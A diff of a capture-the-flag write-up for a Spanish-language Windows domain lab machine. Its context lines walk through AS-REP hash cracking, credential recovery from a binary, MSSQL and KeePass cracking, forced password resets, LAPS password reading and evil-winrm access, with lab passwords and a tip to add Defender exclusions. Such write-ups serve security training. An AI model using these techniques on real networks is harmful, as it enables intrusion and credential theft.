@@ -62,7 +62,7 @@ ftp> ls
 02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
 ```
 
-There seems to be PDFs within this folder. I downloaded the `README.txt` file first.&#x20;
+There seems to be PDFs within this folder. I downloaded the `README.txt` file first.
 
 ```
 $ cat README.txt       
@@ -129,7 +129,7 @@ $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:2df046b679a372879de71bc55877ee5a$af8417e1
 ```
 {% endcode %}
 
-This works! The hash can be easily cracked using `john`.&#x20;
+This works! The hash can be easily cracked using `john`.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
@@ -143,7 +143,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-We now have credentials!&#x20;
+We now have credentials!
 
 ### SMB + Bloodhound
 
@@ -195,7 +195,7 @@ $ file WinRM\ Service.msg
 WinRM Service.msg: CDFV2 Microsoft Outlook Message
 ```
 
-I transferred this to my Windows VM for some reverse engineering.&#x20;
+I transferred this to my Windows VM for some reverse engineering.
 
 I also used `bloodhound-python` to collect information about the domain for me. The first time I ran it, it generated this error:
 
@@ -234,9 +234,9 @@ The `nmap` scan earlier shows that port 1433 is indeed open. Checking this user'
 
 <figure><img src="../../../.gitbook/assets/image (4059).png" alt=""><figcaption></figcaption></figure>
 
-The steps are rather clear, we need to somehow reverse engineer that `.exe` file to gain a shell as the `svc_mssql` user.&#x20;
+The steps are rather clear, we need to somehow reverse engineer that `.exe` file to gain a shell as the `svc_mssql` user.
 
-### Reverse Engineering&#x20;
+### Reverse Engineering
 
 I transferred this over to my Windows VM. Running it seems to do nothing oddly:
 
@@ -250,7 +250,7 @@ Afterwards, it used it ot do something else:
 
 <figure><img src="../../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>
 
-It also seems that this file is being destroyed by the binary after running. To catch this file, we would have to use a Powershell infinite loop that would keep checking for both directories and the `.bat` file being created, and then read the output of it.&#x20;
+It also seems that this file is being destroyed by the binary after running. To catch this file, we would have to use a Powershell infinite loop that would keep checking for both directories and the `.bat` file being created, and then read the output of it.
 
 It was rather difficult to catch this `.bat` file for some reason, and I took a lot of runs before being able to. I used a simple Powershell loop that reads the file:
 
@@ -296,7 +296,7 @@ set username=cybervaca
 .\<name>.bat
 ```
 
-This would create the files that we want (after taking a few minutes). Afterwards, we would get a `monta.ps1` and a `restart-service.exe` file on our machine. Also, it detects this as raare, so make sure to include the needed exclusions from Defender.&#x20;
+This would create the files that we want (after taking a few minutes). Afterwards, we would get a `monta.ps1` and a `restart-service.exe` file on our machine. Also, it detects this as raare, so make sure to include the needed exclusions from Defender.
 
 ```
 -a----         6/20/2023  11:59 PM        1746599 B811.bat
@@ -329,11 +329,11 @@ I tried searching for 'Password' and found it here!
 
 ### MS-SQL Access -> PrintSpoof Fail
 
-Now that we have creds for `svc_oracle`, let's try to access the database as it. However, it appears that this `svc_oracle` user is not present anywhere within the domain users, and only `svc_mssql` is.&#x20;
+Now that we have creds for `svc_oracle`, let's try to access the database as it. However, it appears that this `svc_oracle` user is not present anywhere within the domain users, and only `svc_mssql` is.
 
-The password was contained both `oracle` and `2010`. I was stuck here for a long time, and looked at a guide. Turns out we just need to change the password to have `mssql` instead of `oracle` and `2020` instead of `2010` (which I felt was an unecessary step for this machine at this point).&#x20;
+The password was contained both `oracle` and `2010`. I was stuck here for a long time, and looked at a guide. Turns out we just need to change the password to have `mssql` instead of `oracle` and `2020` instead of `2010` (which I felt was an unecessary step for this machine at this point).
 
-Anyways, we can then access the database as the `sa` user.&#x20;
+Anyways, we can then access the database as the `sa` user.
 
 <figure><img src="../../../.gitbook/assets/image (1618).png" alt=""><figcaption></figcaption></figure>
 
@@ -383,15 +383,15 @@ This shell works after changing the credentials:
 
 <figure><img src="../../../.gitbook/assets/image (2384).png" alt=""><figcaption></figcaption></figure>
 
-Now, we can upload `PrintSpoofer.exe` to the machine.&#x20;
+Now, we can upload `PrintSpoofer.exe` to the machine.
 
 <figure><img src="../../../.gitbook/assets/image (3853).png" alt=""><figcaption></figcaption></figure>
 
-However, this just doesn't work for some reason. I think the author must've patched the usage of PrintSpoofer, because in theory it would lead to an automatic root shell.&#x20;
+However, this just doesn't work for some reason. I think the author must've patched the usage of PrintSpoofer, because in theory it would lead to an automatic root shell.
 
 ### Port Forward -> WinRM Fail
 
-I noted that it was not possible for me to connect back to my host, probably due to firewall rules blocking inbound WinRM connections. We can read the rules using `Get-NetFirewallRules`. Again, it's all in Spanish.&#x20;
+I noted that it was not possible for me to connect back to my host, probably due to firewall rules blocking inbound WinRM connections. We can read the rules using `Get-NetFirewallRules`. Again, it's all in Spanish.
 
 ```
 Name                  : {647E1258-90D4-47EE-B28A-82DE515A1326}
@@ -427,9 +427,9 @@ Then we can install the `assembly.dll` file (which has been renamed).
 
 <figure><img src="../../../.gitbook/assets/image (3307).png" alt=""><figcaption></figcaption></figure>
 
-Then we can runthe same command using `-start -reciclador 'C:\Windows\Temp\reciclador.dll`.&#x20;
+Then we can runthe same command using `-start -reciclador 'C:\Windows\Temp\reciclador.dll`.
 
-This would open a listener port on our port 1337, which is supposed to let us conenct via WinRM in, but I kept getting this error when running it.&#x20;
+This would open a listener port on our port 1337, which is supposed to let us conenct via WinRM in, but I kept getting this error when running it.
 
 ```
 $ python2 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -start -reciclador 'C:\Windows\Temp\reciclador.dll'/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
@@ -454,7 +454,7 @@ mssqlproxy - Copyright 2020 BlackArrow
 [*] Bye!
 ```
 
-The connection kept cutting out when I connected via this method, so this again, doesn't work.&#x20;
+The connection kept cutting out when I connected via this method, so this again, doesn't work.
 
 ### Remote Powershell -> Keepass Crack
 
@@ -471,14 +471,14 @@ try {
 }
 ```
 
-I used his command to get the KeePass database out.&#x20;
+I used his command to get the KeePass database out.
 
 ```
 $ file decoded           
 decoded: Keepass password database 2.x KDBX
 ```
 
-Afterwards, we can crack this database password using `keepass2john`.&#x20;
+Afterwards, we can crack this database password using `keepass2john`.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt kp_hash 
@@ -543,7 +543,7 @@ We can upload PowerView.ps1 via `scp` to the current user's directory, and then 
 </strong>Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
 </code></pre>
 
-Since `dr.zaiuss` is not part of the SSH group, we have to port forward via `ssh` to access that user using `evil-winrm`.&#x20;
+Since `dr.zaiuss` is not part of the SSH group, we have to port forward via `ssh` to access that user using `evil-winrm`.
 
 ```
 $ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh -L 5985:127.0.0.1:5985 3V4Si0N@LicorDeBellota.htb
@@ -702,7 +702,7 @@ namespace restart_oracle
 }
 ```
 
-It appears we have another Reverse Engineering to do. There are some credentials being passed around within this program. In this case, we can grab this binary and transfer it back to our Windows machine for some reverse engineering.&#x20;
+It appears we have another Reverse Engineering to do. There are some credentials being passed around within this program. In this case, we can grab this binary and transfer it back to our Windows machine for some reverse engineering.
 
 Since they provided the source code in C#, I opened this binary up in `dnSpy`. In this, we see the completed program with the correct cipher:
 
@@ -712,7 +712,7 @@ We can set a breakpoint at the `Console.WriteLine` function, which is right afte
 
 <figure><img src="../../../.gitbook/assets/image (2369).png" alt=""><figcaption></figcaption></figure>
 
-The `array` variable contains the decoded password, and we can convert all of this to text.&#x20;
+The `array` variable contains the decoded password, and we can convert all of this to text.
 
 <figure><img src="../../../.gitbook/assets/image (3330).png" alt=""><figcaption></figcaption></figure>
 
@@ -758,13 +758,13 @@ Going back to Bloodhound, we see that the new user `jari` has `ForceChangePasswo
 
 <figure><img src="../../../.gitbook/assets/image (3678).png" alt=""><figcaption></figcaption></figure>
 
-The `gibdeon` user is part of the Account Operations group (after translation). We can first reset the user's password using the same commands as the other password resets `gibdeon` user is not part of either SSH or WinRM groups, so we probably use remote Powershell scriptblocks to abuse this.&#x20;
+The `gibdeon` user is part of the Account Operations group (after translation). We can first reset the user's password using the same commands as the other password resets `gibdeon` user is not part of either SSH or WinRM groups, so we probably use remote Powershell scriptblocks to abuse this.
 
 The Account Operators group has `GenericAll` privileges over the `LAPS READ` group, and can also create new non-administrator accounts within the domain (in-built AD privilege).
 
 <figure><img src="../../../.gitbook/assets/image (3036).png" alt=""><figcaption></figcaption></figure>
 
-Since we basically have access to all groups in this domain, we can just add our `jari` user to both `LAPS READ` and `LAPS ADM`.&#x20;
+Since we basically have access to all groups in this domain, we can just add our `jari` user to both `LAPS READ` and `LAPS ADM`.
 
 ### LAPS Read
 
@@ -777,7 +777,7 @@ Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass
 $cred = New-Object System.Management.Automation.PSCredential('gibdeon', $pass)
 ```
 
-Afterwards, we can add ourselves to the `LAPS READ` and `LAPS ADM` groups.&#x20;
+Afterwards, we can add ourselves to the `LAPS READ` and `LAPS ADM` groups.
 
 ```powershell
 Add-DomainGroupMember -Identity 'LAPS ADM' -Credential $cred -Members jari
@@ -796,7 +796,7 @@ Password            : x6IiaQd8sOmUW5Y90FNG
 ExpirationTimestamp : 6/21/2023 5:05:11 PM
 ```
 
-Afterwards, we can simply `evil-winrm` into the `administrador` account. **Because this box is in Spanish, the name also differs**.&#x20;
+Afterwards, we can simply `evil-winrm` into the `administrador` account. **Because this box is in Spanish, the name also differs**.
 
 ```
 *Evil-WinRM* PS C:\Users\jari\Documents> net user s                                   s
@@ -817,4 +817,4 @@ superfume                svc_mssql                v1s0r
 
 <figure><img src="../../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>
 
-The `root.txt` flag is located within `C:\Users\cybervaca\desktop`. Doing CRTO and reading about Windows Auth helped a lot for this machine. Rooted!&#x20;
+The `root.txt` flag is located within `C:\Users\cybervaca\desktop`. Doing CRTO and reading about Windows Auth helped a lot for this machine. Rooted!
